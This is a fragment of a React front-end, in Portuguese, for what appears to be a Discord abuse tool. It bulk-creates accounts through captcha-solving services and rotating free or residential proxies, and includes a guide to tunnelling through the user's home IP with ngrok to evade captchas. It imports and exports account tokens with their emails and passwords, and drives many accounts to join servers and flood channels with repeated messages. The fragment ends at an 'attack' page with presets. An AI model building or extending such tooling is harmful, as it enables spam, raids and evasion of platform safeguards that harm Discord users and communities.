                            if (d.ok) addLog(`✅ Proxy OK — gateway: ${d.gateway} (${d.ms}ms)${d.usingProxy ? " via proxy" : " (sem proxy)"}`, "success");
                            else addLog(`❌ Proxy falhou: ${d.error}`, "error");
                          })
                          .catch(e => addLog(`❌ ${String(e)}`, "error"));
                      }}
                    >
                      🔍 Testar
                    </button>
                    <button
                      className="lb-btn"
                      style={{ padding: "0 10px", fontSize: 11, whiteSpace: "nowrap", background: "rgba(255,200,0,0.08)", borderColor: "rgba(255,200,0,0.3)", color: dFetchingProxy ? "#888" : "#ffc800" }}
                      disabled={dFetchingProxy || dCreateLoading}
                      onClick={() => {
                        setDFetchingProxy(true);
                        addLog("🔍 Buscando proxy gratuito que funcione com Discord...", "info");
                        fetch(`${BASE}/api/discord/accounts/free-proxy`)
                          .then(r => r.json())
                          .then((d: { ok?: boolean; proxy?: string; all_proxies?: string[]; total_tested?: number; total_working?: number; error?: string }) => {
                            if (d.ok && d.proxy) {
                              setDCreateProxy(d.proxy);
                              setDAutoProxies(d.all_proxies ?? [d.proxy]);
                              addLog(`✅ ${d.total_working} proxies gratuitos encontrados (${d.total_tested} testados) — ${d.total_working! > 1 ? "rotação automática ativada" : "usando " + d.proxy}`, "success");
                            } else {
                              addLog(`❌ Auto-proxy falhou: ${d.error}`, "error");
                            }
                          })
                          .catch(e => addLog(`❌ ${String(e)}`, "error"))
                          .finally(() => setDFetchingProxy(false));
                      }}
                    >
                      {dFetchingProxy ? "⏳..." : "🆓 Auto"}
                    </button>
                  </div>

                  {/* Residential proxy status */}
                  {dUseResidential && (
                    <div style={{ background: "rgba(46,204,113,0.06)", border: "1px solid rgba(46,204,113,0.2)", borderRadius: 6, padding: "6px 10px", marginBottom: 8, fontSize: 11, color: "#2ecc71", lineHeight: 1.5 }}>
                      🏠 Usando proxy residencial configurado (proxy.proxying.io) — IPs residenciais têm maior chance de passar sem captcha.
                    </div>
                  )}

                  {/* "Use My IP" guide toggle */}
                  <button
                    onClick={() => setDShowMyIPGuide(v => !v)}
                    style={{ background: "none", border: "none", cursor: "pointer", color: "#5865f2", fontSize: 11, padding: "2px 0", marginBottom: dShowMyIPGuide ? 6 : 4, display: "flex", alignItems: "center", gap: 4 }}
                  >
                    {dShowMyIPGuide ? "▼" : "▶"} 🏠 Como usar meu próprio IP para criar contas?
                  </button>

                  {dShowMyIPGuide && (
                    <div style={{ background: "rgba(88,101,242,0.06)", border: "1px solid rgba(88,101,242,0.25)", borderRadius: 8, padding: "12px 14px", marginBottom: 10, fontSize: 11, lineHeight: 1.8 }}>
                      <div style={{ color: "#7289da", fontWeight: 700, marginBottom: 8, fontSize: 12 }}>🏠 Usar seu IP residencial (grátis)</div>
                      <div style={{ color: "#aaa", marginBottom: 10 }}>
                        Seu IP de casa é residencial e o Discord aceita. Precisamos rodar um mini-proxy na sua máquina e expor com ngrok para o servidor conseguir rotear as requisições pelo seu IP.
                      </div>

                      <div style={{ color: "#ccc", fontWeight: 600, marginBottom: 4 }}>Passo 1 — Instalar o proxy (Python):</div>
                      {(["pip install proxy.py", "proxy --port 8899 --log-level ERROR"] as string[]).map((cmd, i) => (
                        <div key={i} style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
                          <code style={{ flex: 1, background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 4, padding: "3px 8px", fontFamily: "var(--font-mono)", color: "#98c379", fontSize: 11 }}>
                            {cmd}
                          </code>
                          <button
                            onClick={() => { navigator.clipboard.writeText(cmd); addLog(`📋 Copiado: ${cmd}`, "info"); }}
                            style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 4, color: "#888", cursor: "pointer", padding: "2px 7px", fontSize: 10, whiteSpace: "nowrap" }}
                          >
                            📋
                          </button>
                        </div>
                      ))}

                      <div style={{ color: "#ccc", fontWeight: 600, margin: "10px 0 4px" }}>Passo 2 — Expor com ngrok <span style={{ color: "#666", fontWeight: 400 }}>(outro terminal)</span>:</div>
                      {(["ngrok tcp 8899"] as string[]).map((cmd, i) => (
                        <div key={i} style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 4 }}>
                          <code style={{ flex: 1, background: "rgba(0,0,0,0.4)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 4, padding: "3px 8px", fontFamily: "var(--font-mono)", color: "#98c379", fontSize: 11 }}>
                            {cmd}
                          </code>
                          <button
                            onClick={() => { navigator.clipboard.writeText(cmd); addLog(`📋 Copiado: ${cmd}`, "info"); }}
                            style={{ background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.12)", borderRadius: 4, color: "#888", cursor: "pointer", padding: "2px 7px", fontSize: 10, whiteSpace: "nowrap" }}
                          >
                            📋
                          </button>
                        </div>
                      ))}

                      <div style={{ color: "#aaa", marginTop: 8 }}>
                        O ngrok vai mostrar algo como <code style={{ color: "#e5c07b", background: "rgba(0,0,0,0.3)", padding: "1px 5px", borderRadius: 3 }}>tcp://0.tcp.ngrok.io:12345</code><br/>
                        Cole no campo Proxy acima como: <code style={{ color: "#e5c07b", background: "rgba(0,0,0,0.3)", padding: "1px 5px", borderRadius: 3 }}>http://0.tcp.ngrok.io:12345</code><br/>
                        Depois clique em <b style={{ color: "#2ecc71" }}>🔍 Testar</b> para confirmar que funciona.
                      </div>

                      <div style={{ marginTop: 10, padding: "6px 10px", background: "rgba(255,200,0,0.07)", border: "1px solid rgba(255,200,0,0.2)", borderRadius: 5, color: "#ffc800" }}>
                        ⚠️ <b>Python</b>: python.org &nbsp;|&nbsp; <b>ngrok</b>: ngrok.com (grátis, requer conta) &nbsp;|&nbsp; Use <code>ngrok tcp</code> (não <code>http</code>) para HTTPS funcionar.
                      </div>

                      <div style={{ marginTop: 8, color: "#666", fontSize: 10 }}>
                        Sem Python? Alternativa Node.js: <code style={{ color: "#98c379" }}>npx hoxy --port 8899</code> &nbsp;|&nbsp; Ou qualquer proxy HTTP/SOCKS5 local (Fiddler, Charles, etc.)
                      </div>
                    </div>
                  )}

                  {/* Progress bar */}
                  {dCreateLoading && (
                    <div style={{ marginBottom: 8 }}>
                      <div style={{ display: "flex", justifyContent: "space-between", marginBottom: 4, fontSize: 11, color: "#888" }}>
                        <span>⏳ Conta {Math.min(dCreateProgress + 1, dCreateCount)}/{dCreateCount} — aguardando Discord...</span>
                        <span>{dCreateProgress}/{dCreateCount} ✅</span>
                      </div>
                      <div style={{ height: 4, background: "rgba(255,255,255,0.08)", borderRadius: 2, overflow: "hidden" }}>
                        <div style={{ height: "100%", width: `${dCreateCount > 0 ? (dCreateProgress / dCreateCount) * 100 : 0}%`, background: "linear-gradient(90deg, #5865f2, #7289da)", borderRadius: 2, transition: "width 0.4s" }} />
                      </div>
                    </div>
                  )}

                  {/* Browser mode button — uses user's IP directly */}
                  <button
                    className="lb-btn lb-btn--gold"
                    style={{ width: "100%", padding: "9px", marginBottom: 6, background: "linear-gradient(135deg, rgba(46,204,113,0.25), rgba(46,204,113,0.12))", borderColor: "rgba(46,204,113,0.5)", color: "#2ecc71" }}
                    disabled={dCreateLoading}
                    onClick={async () => {
                      setDCreateLoading(true);
                      setDCreateResults([]);
                      setDCreateProgress(0);
                      addLog(`🌐 Iniciando criação de ${dCreateCount} conta(s) via browser (seu IP)...`, "info");
                      let created = 0;
                      for (let i = 0; i < dCreateCount; i++) {
                        const r = await browserCreateOneAccount();
                        setDCreateProgress(i + 1);
                        setDCreateResults(prev => [...prev, r]);
                        if (r.status === "ok") {
                          created++;
                          addLog(`✅ Conta ${i + 1}/${dCreateCount}: ${r.username} — ${r.email}`, "success");
                          loadDAccounts();
                        } else {
                          addLog(`❌ Conta ${i + 1}/${dCreateCount}: ${r.detail}`, "error");
                        }
                        if (i < dCreateCount - 1) await new Promise(res => setTimeout(res, dCreateDelay));
                      }
                      addLog(`🌐 Criação via browser: ${created}/${dCreateCount} conta(s) criada(s)`, created > 0 ? "success" : "error");
                      setDCreateLoading(false);
                    }}
                  >
                    {dCreateLoading ? `⏳ Criando...` : `🌐 Via Browser (Seu IP) — ${dCreateCount} Conta(s)`}
                  </button>

                  <button
                    className="lb-btn lb-btn--gold"
                    style={{ width: "100%", padding: "9px", background: "linear-gradient(135deg, rgba(88,101,242,0.3), rgba(114,137,218,0.2))", borderColor: "rgba(88,101,242,0.5)", color: "#7289da" }}
                    disabled={dCreateLoading}
                    onClick={async () => {
                      setDCreateLoading(true);
                      setDCreateResults([]);
                      setDCreateProgress(0);
                      try {
                        const resp = await fetch(`${BASE}/api/discord/accounts/create`, {
                          method: "POST",
                          headers: { "Content-Type": "application/json" },
                          body: JSON.stringify({
                            count: dCreateCount,
                            captchaService: dCreateService,
                            captchaApiKey: dCreateApiKey,
                            delay: dCreateDelay,
                            proxy: dUseResidential ? undefined : dCreateProxy,
                            proxies: !dUseResidential && dAutoProxies.length > 1 ? dAutoProxies : undefined,
                            useResidential: dUseResidential,
                          }),
                        });
                        if (!resp.body) throw new Error("sem stream");
                        const reader = resp.body.getReader();
                        const decoder = new TextDecoder();
                        let buf = "";
                        while (true) {
                          const { done, value } = await reader.read();
                          if (done) break;
                          buf += decoder.decode(value, { stream: true });
                          const lines = buf.split("\n");
                          buf = lines.pop() ?? "";
                          let pendingData: string | null = null;
                          let pendingEvent = "message";
                          for (const line of lines) {
                            if (line.startsWith("event: ")) { pendingEvent = line.slice(7).trim(); }
                            else if (line.startsWith("data: ")) { pendingData = line.slice(6).trim(); }
                            else if (line === "" && pendingData !== null) {
                              try {
                                const ev = JSON.parse(pendingData) as Record<string, unknown>;
                                if (pendingEvent === "result") {
                                  const r = ev.result as CreateAccResult;
                                  setDCreateProgress(ev.done as number);
                                  setDCreateResults(prev => [...prev, r]);
                                } else if (pendingEvent === "done") {
                                  addLog(`⚡ ${ev.created}/${ev.total} conta(s) criada(s) com sucesso`, (ev.created as number) > 0 ? "success" : "error");
                                  if ((ev.created as number) > 0) loadDAccounts();
                                } else if (pendingEvent === "start") {
                                  addLog(`⚡ Iniciando criação de ${ev.total} conta(s)...`, "info");
                                }
                              } catch { /* ignore parse error */ }
                              pendingData = null;
                              pendingEvent = "message";
                            }
                          }
                        }
                      } catch (e) {
                        addLog(`❌ ${String(e)}`, "error");
                      } finally {
                        setDCreateLoading(false);
                      }
                    }}
                  >
                    {dCreateLoading ? `⏳ Criando ${dCreateCount} conta(s)...` : `⚡ Criar ${dCreateCount} Conta(s)`}
                  </button>

                  {/* Creation results */}
                  {dCreateResults.length > 0 && (
                    <div style={{ marginTop: 10, maxHeight: 160, overflowY: "auto", display: "flex", flexDirection: "column", gap: 4 }}>
                      {dCreateResults.map((r, i) => (
                        <div key={i} style={{
                          display: "flex", alignItems: "flex-start", gap: 7,
                          padding: "6px 10px", borderRadius: 6,
                          background: r.saved ? "rgba(46,204,113,0.07)" : r.status === "captcha_needed" ? "rgba(212,175,55,0.07)" : "rgba(231,76,60,0.07)",
                          border: `1px solid ${r.saved ? "rgba(46,204,113,0.2)" : r.status === "captcha_needed" ? "rgba(212,175,55,0.3)" : "rgba(231,76,60,0.2)"}`,
                          fontSize: 11,
                        }}>
                          <span style={{ flexShrink: 0, marginTop: 1 }}>{r.saved ? "✅" : r.status === "captcha_needed" ? "🔑" : "❌"}</span>
                          <div style={{ flex: 1, minWidth: 0 }}>
                            {r.username && <span style={{ fontWeight: 700, color: "#e8e8e8" }}>{r.username} </span>}
                            <span style={{ color: "#888" }}>{r.detail}</span>
                            {r.email && (
                              <div style={{ color: "#666", fontSize: 10, fontFamily: "var(--font-mono)", marginTop: 2 }}>
                                📧 {r.email}
                                {r.password && <span style={{ color: "#555" }}> · 🔑 {r.password}</span>}
                              </div>
                            )}
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </section>

                {/* Add tokens */}
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">➕</span>
                    <h3 className="lb-cred-section-title">Adicionar Tokens</h3>
                  </div>
                  <p style={{ fontSize: 12, color: "#aaa", marginBottom: 10, lineHeight: 1.5 }}>
                    Cole um ou mais tokens de contas Discord (um por linha). Os tokens são verificados automaticamente.
                  </p>
                  <textarea
                    className="lb-input"
                    rows={5}
                    style={{ width: "100%", resize: "vertical", fontSize: 11, fontFamily: "var(--font-mono)", marginBottom: 8 }}
                    placeholder={"token1\ntoken2\ntoken3..."}
                    value={dAccTokenInput}
                    onChange={e => setDAccTokenInput(e.target.value)}
                  />
                  <button
                    className="lb-btn lb-btn--gold"
                    style={{ width: "100%", padding: "9px" }}
                    disabled={dAccAdding || !dAccTokenInput.trim()}
                    onClick={() => {
                      setDAccAdding(true); setDAccError("");
                      fetch(`${BASE}/api/discord/accounts`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ tokens: dAccTokenInput }),
                      })
                        .then(r => r.json())
                        .then((d: { added?: number; results?: Array<{ status: string; username?: string }>; error?: string }) => {
                          if (d.error) { setDAccError(d.error); return; }
                          addLog(`👥 ${d.added ?? 0} conta(s) adicionada(s)`, "success");
                          setDAccTokenInput("");
                          loadDAccounts();
                        })
                        .catch(e => setDAccError(String(e)))
                        .finally(() => setDAccAdding(false));
                    }}
                  >
                    {dAccAdding ? "⏳ Verificando..." : "✓ Adicionar Tokens"}
                  </button>
                  {dAccError && (
                    <div style={{ marginTop: 8, color: "#e74c3c", fontSize: 12, padding: "7px 10px", background: "rgba(231,76,60,0.08)", borderRadius: 6, border: "1px solid rgba(231,76,60,0.2)" }}>
                      ⚠ {dAccError}
                    </div>
                  )}
                </section>

                {/* Account list */}
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">👥</span>
                    <h3 className="lb-cred-section-title">Contas</h3>
                    <span style={{ marginLeft: "auto", display: "flex", gap: 6, alignItems: "center" }}>
                      <span style={{ fontSize: 11, color: "#2ecc71", fontWeight: 700 }}>{dAccounts.filter(a => a.status === "ok").length} ok</span>
                      {dAccounts.filter(a => a.status === "unknown").length > 0 && (
                        <span style={{ fontSize: 11, color: "#d4af37", fontWeight: 700 }}>{dAccounts.filter(a => a.status === "unknown").length} pendente</span>
                      )}
                      <button
                        className="lb-btn"
                        style={{ padding: "3px 10px", fontSize: 11, background: "rgba(88,101,242,0.15)", border: "1px solid rgba(88,101,242,0.3)", color: "#7289da", borderRadius: 5 }}
                        disabled={dAccVerifying}
                        onClick={() => {
                          setDAccVerifying(true);
                          fetch(`${BASE}/api/discord/accounts/verify`, { method: "POST" })
                            .then(r => r.json())
                            .then((d: { accounts?: DiscordAccount[] }) => { if (d.accounts) setDAccounts(d.accounts); })
                            .finally(() => setDAccVerifying(false));
                        }}
                      >
                        {dAccVerifying ? "⏳" : "↺ Verificar"}
                      </button>
                      <button
                        className="lb-btn"
                        style={{ padding: "3px 10px", fontSize: 11, background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", color: "#aaa", borderRadius: 5 }}
                        onClick={loadDAccounts}
                        disabled={dAccLoading}
                      >
                        {dAccLoading ? "⏳" : "↺"}
                      </button>
                      {dAccounts.length > 0 && (
                        <button
                          className="lb-btn"
                          style={{ padding: "3px 10px", fontSize: 11, background: "rgba(46,204,113,0.08)", border: "1px solid rgba(46,204,113,0.25)", color: "#2ecc71", borderRadius: 5 }}
                          title="Exportar tokens como arquivo de texto"
                          onClick={() => {
                            const lines = dAccounts.filter(a => a.status !== "invalid").map(a => {
                              const parts = [a.token.replace("…", "")];
                              if (a.email) parts.push(a.email);
                              if (a.password) parts.push(a.password);
                              return parts.join(":");
                            });
                            const blob = new Blob([lines.join("\n")], { type: "text/plain" });
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement("a");
                            a.href = url; a.download = `discord-tokens-${Date.now()}.txt`; a.click();
                            URL.revokeObjectURL(url);
                            addLog(`📥 Exportados ${lines.length} token(s)`, "success");
                          }}
                        >
                          📥
                        </button>
                      )}
                    </span>
                  </div>

                  {/* Select all */}
                  {dAccounts.length > 0 && (
                    <div style={{ display: "flex", gap: 8, marginBottom: 8 }}>
                      <button
                        className="lb-btn"
                        style={{ fontSize: 11, padding: "3px 10px", background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 5, color: "#ccc" }}
                        onClick={() => setDAccSelected(new Set(dAccounts.filter(a => a.status !== "invalid").map(a => a.id)))}
                      >
                        ✓ Selecionar válidas
                      </button>
                      <button
                        className="lb-btn"
                        style={{ fontSize: 11, padding: "3px 10px", background: "rgba(255,255,255,0.05)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 5, color: "#ccc" }}
                        onClick={() => setDAccSelected(new Set())}
                      >
                        ✕ Limpar
                      </button>
                      <span style={{ fontSize: 11, color: "#888", alignSelf: "center" }}>{dAccSelected.size} selecionada(s)</span>
                    </div>
                  )}

                  {dAccLoading && dAccounts.length === 0 && (
                    <div style={{ padding: "16px", textAlign: "center", color: "#d4af37", fontSize: 13 }}>⏳ Carregando contas...</div>
                  )}
                  {!dAccLoading && dAccounts.length === 0 && (
                    <div style={{ padding: "16px", textAlign: "center", color: "#666", fontSize: 12 }}>Nenhuma conta adicionada. Cole um token acima.</div>
                  )}

                  <div style={{ display: "flex", flexDirection: "column", gap: 5, maxHeight: 320, overflowY: "auto" }}>
                    {dAccounts.map(acc => (
                      <div
                        key={acc.id}
                        onClick={() => setDAccSelected(prev => {
                          const s = new Set(prev);
                          if (s.has(acc.id)) s.delete(acc.id); else s.add(acc.id);
                          return s;
                        })}
                        style={{
                          display: "flex", alignItems: "center", gap: 10,
                          padding: "8px 12px", borderRadius: 8, cursor: "pointer",
                          background: dAccSelected.has(acc.id) ? "rgba(88,101,242,0.15)" : "rgba(255,255,255,0.03)",
                          border: dAccSelected.has(acc.id) ? "1.5px solid rgba(88,101,242,0.5)" : "1px solid rgba(255,255,255,0.08)",
                          transition: "all 0.1s",
                        }}
                      >
                        {/* Avatar / initial */}
                        {(() => {
                          const avatarBg = acc.status === "ok" ? "rgba(88,101,242,0.3)" : acc.status === "unknown" ? "rgba(212,175,55,0.2)" : "rgba(231,76,60,0.2)";
                          const avatarBorder = acc.status === "ok" ? "rgba(88,101,242,0.5)" : acc.status === "unknown" ? "rgba(212,175,55,0.4)" : "rgba(231,76,60,0.4)";
                          return (
                            <div style={{ width: 32, height: 32, borderRadius: "50%", flexShrink: 0, overflow: "hidden", background: avatarBg, border: `2px solid ${avatarBorder}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 14 }}>
                              {acc.avatar ? <img src={`https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png?size=64`} alt="" style={{ width: "100%", height: "100%", objectFit: "cover" }} /> : acc.username[0]?.toUpperCase() ?? "?"}
                            </div>
                          );
                        })()}
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div style={{ fontWeight: 700, fontSize: 12, color: acc.status === "invalid" ? "#888" : "#e8e8e8", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                            {acc.username}
                            {acc.discriminator !== "0" && acc.discriminator !== "0000" && (
                              <span style={{ color: "#666", fontWeight: 400 }}>#{acc.discriminator}</span>
                            )}
                          </div>
                          <div style={{ fontSize: 10, color: "#555", fontFamily: "var(--font-mono)" }}>{acc.id}</div>
                          {acc.createdAuto && acc.email && (
                            <div style={{ fontSize: 9, color: "#666", fontFamily: "var(--font-mono)", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>
                              📧 {acc.email}{acc.password ? ` · 🔑 ${acc.password}` : ""}
                            </div>
                          )}
                        </div>
                        <div style={{ display: "flex", alignItems: "center", gap: 6, flexShrink: 0 }}>
                          <span style={{
                            fontSize: 10, fontWeight: 700, padding: "2px 7px", borderRadius: 10,
                            background: acc.status === "ok" ? "rgba(46,204,113,0.15)" : acc.status === "unknown" ? "rgba(212,175,55,0.15)" : "rgba(231,76,60,0.15)",
                            color: acc.status === "ok" ? "#2ecc71" : acc.status === "unknown" ? "#d4af37" : "#e74c3c",
                            border: `1px solid ${acc.status === "ok" ? "rgba(46,204,113,0.3)" : acc.status === "unknown" ? "rgba(212,175,55,0.3)" : "rgba(231,76,60,0.3)"}`,
                          }}>
                            {acc.status === "ok" ? "✓ válida" : acc.status === "unknown" ? "? pendente" : "✗ inválida"}
                          </span>
                          <button
                            className="lb-btn"
                            style={{ padding: "2px 8px", fontSize: 10, background: "rgba(231,76,60,0.1)", border: "1px solid rgba(231,76,60,0.3)", color: "#e74c3c", borderRadius: 5 }}
                            onClick={e => {
                              e.stopPropagation();
                              fetch(`${BASE}/api/discord/accounts/${acc.id}`, { method: "DELETE" })
                                .then(() => setDAccounts(prev => prev.filter(a => a.id !== acc.id)));
                            }}
                          >
                            ✕
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </section>
              </div>

              {/* RIGHT — actions */}
              <div className="lb-cred-right" style={{ flex: 1, minWidth: 0 }}>

                {/* Action sub-tabs */}
                <div style={{ display: "flex", gap: 6, marginBottom: 14 }}>
                  {(["join", "message"] as const).map(t => (
                    <button
                      key={t}
                      onClick={() => setDActionTab(t)}
                      style={{
                        padding: "6px 16px", borderRadius: 7, fontSize: 12, fontWeight: 700, cursor: "pointer",
                        border: dActionTab === t ? "1.5px solid rgba(88,101,242,0.7)" : "1px solid rgba(255,255,255,0.08)",
                        background: dActionTab === t ? "rgba(88,101,242,0.15)" : "rgba(255,255,255,0.03)",
                        color: dActionTab === t ? "#7289da" : "#666",
                      }}
                    >
                      {t === "join" ? "🔗 Entrar em Servidor" : "💬 Enviar Mensagem"}
                    </button>
                  ))}
                </div>

                {/* ── JOIN SERVER ── */}
                {dActionTab === "join" && (
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">🔗</span>
                    <h3 className="lb-cred-section-title">Entrar em Servidor</h3>
                    <span style={{ marginLeft: "auto", fontSize: 11, color: "#888" }}>{dAccSelected.size} conta(s) selecionada(s)</span>
                  </div>
                  <p style={{ fontSize: 12, color: "#aaa", marginBottom: 12, lineHeight: 1.5 }}>
                    As contas selecionadas vão entrar no servidor via código de convite.
                  </p>

                  <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 4 }}>Link ou código do convite</label>
                  <input
                    className="lb-input"
                    style={{ width: "100%", marginBottom: 10, fontFamily: "var(--font-mono)", fontSize: 12 }}
                    placeholder="https://discord.gg/XXXXX ou apenas XXXXX"
                    value={dJoinCode}
                    onChange={e => setDJoinCode(e.target.value)}
                  />

                  <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 4 }}>Delay entre contas (ms)</label>
                  <input
                    type="number" min={500} max={30000} step={500}
                    className="lb-input"
                    style={{ width: "100%", marginBottom: 14, fontSize: 12 }}
                    value={dJoinDelay}
                    onChange={e => setDJoinDelay(Number(e.target.value))}
                  />

                  <button
                    className="lb-btn lb-btn--gold"
                    style={{ width: "100%", padding: "9px" }}
                    disabled={dJoinLoading || dAccSelected.size === 0 || !dJoinCode.trim()}
                    onClick={() => {
                      setDJoinLoading(true); setDJoinResults([]);
                      fetch(`${BASE}/api/discord/accounts/join`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ accountIds: [...dAccSelected], inviteCode: dJoinCode, delay: dJoinDelay }),
                      })
                        .then(r => r.json())
                        .then((d: { results?: AccActionResult[]; error?: string }) => {
                          if (d.error) { addLog(`❌ Erro: ${d.error}`, "error"); return; }
                          setDJoinResults(d.results ?? []);
                          const ok = (d.results ?? []).filter(r => r.status === "ok").length;
                          addLog(`🔗 Entrou em servidor: ${ok}/${(d.results ?? []).length} contas`, ok > 0 ? "success" : "error");
                        })
                        .catch(e => addLog(`❌ ${String(e)}`, "error"))
                        .finally(() => setDJoinLoading(false));
                    }}
                  >
                    {dJoinLoading ? `⏳ Entrando... (${dAccSelected.size} contas)` : `🔗 Entrar com ${dAccSelected.size} conta(s)`}
                  </button>

                  {/* Join results */}
                  {dJoinResults.length > 0 && (
                    <div style={{ marginTop: 14, display: "flex", flexDirection: "column", gap: 5 }}>
                      <div style={{ fontSize: 11, color: "#888", marginBottom: 4, fontWeight: 700 }}>Resultados:</div>
                      {dJoinResults.map((r, i) => (
                        <div key={i} style={{
                          display: "flex", alignItems: "center", gap: 8,
                          padding: "7px 12px", borderRadius: 7,
                          background: r.status === "ok" ? "rgba(46,204,113,0.07)" : "rgba(231,76,60,0.07)",
                          border: `1px solid ${r.status === "ok" ? "rgba(46,204,113,0.2)" : "rgba(231,76,60,0.2)"}`,
                        }}>
                          <span style={{ fontSize: 13 }}>{r.status === "ok" ? "✅" : "❌"}</span>
                          <div style={{ flex: 1, minWidth: 0 }}>
                            <span style={{ fontWeight: 700, fontSize: 12, color: "#e8e8e8" }}>{r.username}</span>
                            <span style={{ fontSize: 11, color: "#888", marginLeft: 8 }}>{r.detail}</span>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </section>
                )}

                {/* ── SEND MESSAGE ── */}
                {dActionTab === "message" && (
                <section className="lb-cred-section">
                  <div className="lb-cred-section-header">
                    <span className="lb-cred-section-icon">💬</span>
                    <h3 className="lb-cred-section-title">Enviar Mensagem</h3>
                    <span style={{ marginLeft: "auto", fontSize: 11, color: "#888" }}>{dAccSelected.size} conta(s)</span>
                  </div>
                  <p style={{ fontSize: 12, color: "#aaa", marginBottom: 12, lineHeight: 1.5 }}>
                    Cada conta selecionada enviará a mensagem no canal especificado.
                  </p>

                  <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 4 }}>ID do canal</label>
                  <input
                    className="lb-input"
                    style={{ width: "100%", marginBottom: 10, fontFamily: "var(--font-mono)", fontSize: 12 }}
                    placeholder="Ex: 1234567890123456789"
                    value={dMsgChannelId}
                    onChange={e => setDMsgChannelId(e.target.value)}
                  />

                  <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 4 }}>Mensagem</label>
                  <textarea
                    className="lb-input"
                    rows={4}
                    style={{ width: "100%", resize: "vertical", marginBottom: 10, fontSize: 12 }}
                    placeholder="Texto da mensagem..."
                    value={dMsgText}
                    onChange={e => setDMsgText(e.target.value)}
                  />

                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 14 }}>
                    <div>
                      <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 4 }}>Qtd por conta</label>
                      <input
                        type="number" min={1} max={50}
                        className="lb-input"
                        style={{ width: "100%", fontSize: 12 }}
                        value={dMsgCount}
                        onChange={e => setDMsgCount(Number(e.target.value))}
                      />
                    </div>
                    <div>
                      <label style={{ fontSize: 11, color: "#888", display: "block", marginBottom: 4 }}>Delay (ms)</label>
                      <input
                        type="number" min={500} max={30000} step={500}
                        className="lb-input"
                        style={{ width: "100%", fontSize: 12 }}
                        value={dMsgDelay}
                        onChange={e => setDMsgDelay(Number(e.target.value))}
                      />
                    </div>
                  </div>

                  <button
                    className="lb-btn lb-btn--gold"
                    style={{ width: "100%", padding: "9px" }}
                    disabled={dMsgLoading || dAccSelected.size === 0 || !dMsgChannelId.trim() || !dMsgText.trim()}
                    onClick={() => {
                      setDMsgLoading(true); setDMsgResults([]);
                      fetch(`${BASE}/api/discord/accounts/message`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ accountIds: [...dAccSelected], channelId: dMsgChannelId, message: dMsgText, count: dMsgCount, delay: dMsgDelay }),
                      })
                        .then(r => r.json())
                        .then((d: { results?: AccActionResult[]; error?: string }) => {
                          if (d.error) { addLog(`❌ Erro: ${d.error}`, "error"); return; }
                          setDMsgResults(d.results ?? []);
                          const total = (d.results ?? []).reduce((s, r) => s + (r.sent ?? 0), 0);
                          addLog(`💬 ${total} mensagem(ns) enviada(s)`, total > 0 ? "success" : "error");
                        })
                        .catch(e => addLog(`❌ ${String(e)}`, "error"))
                        .finally(() => setDMsgLoading(false));
                    }}
                  >
                    {dMsgLoading ? "⏳ Enviando..." : `💬 Enviar para ${dAccSelected.size} conta(s)`}
                  </button>

                  {/* Message results */}
                  {dMsgResults.length > 0 && (
                    <div style={{ marginTop: 14, display: "flex", flexDirection: "column", gap: 5 }}>
                      <div style={{ fontSize: 11, color: "#888", marginBottom: 4, fontWeight: 700 }}>Resultados:</div>
                      {dMsgResults.map((r, i) => (
                        <div key={i} style={{
                          display: "flex", alignItems: "center", gap: 8,
                          padding: "7px 12px", borderRadius: 7,
                          background: (r.errors ?? 0) === 0 ? "rgba(46,204,113,0.07)" : "rgba(231,76,60,0.07)",
                          border: `1px solid ${(r.errors ?? 0) === 0 ? "rgba(46,204,113,0.2)" : "rgba(231,76,60,0.2)"}`,
                        }}>
                          <span style={{ fontSize: 13 }}>{(r.errors ?? 0) === 0 ? "✅" : "⚠️"}</span>
                          <div style={{ flex: 1, minWidth: 0 }}>
                            <span style={{ fontWeight: 700, fontSize: 12, color: "#e8e8e8" }}>{r.username}</span>
                            <span style={{ fontSize: 11, color: "#aaa", marginLeft: 8 }}>
                              {r.sent} enviada(s){r.errors ? `, ${r.errors} erro(s)` : ""}
                              {r.lastError ? ` — ${r.lastError}` : ""}
                            </span>
                          </div>
                        </div>
                      ))}
                    </div>
                  )}
                </section>
                )}
              </div>

            </div>
            )}

          </div>
        )}

        {activePage === "attack" && <>

        {/* ── Built-in Presets ── */}
        <div className="lb-presets">
          {PRESETS.map(p => (
            <button
              key={p.label}
              className={`lb-preset${p.method === "geass-override" ? " lb-preset--geass" : ""}`}
              onClick={() => applyPreset(p)}
            >
              {p.method === "geass-override"
                ? <img src={GEASS_SYMBOL} className="lb-preset-symbol" alt=""/>
                : <span>{p.icon}</span>
              }
              {p.label}
            </button>
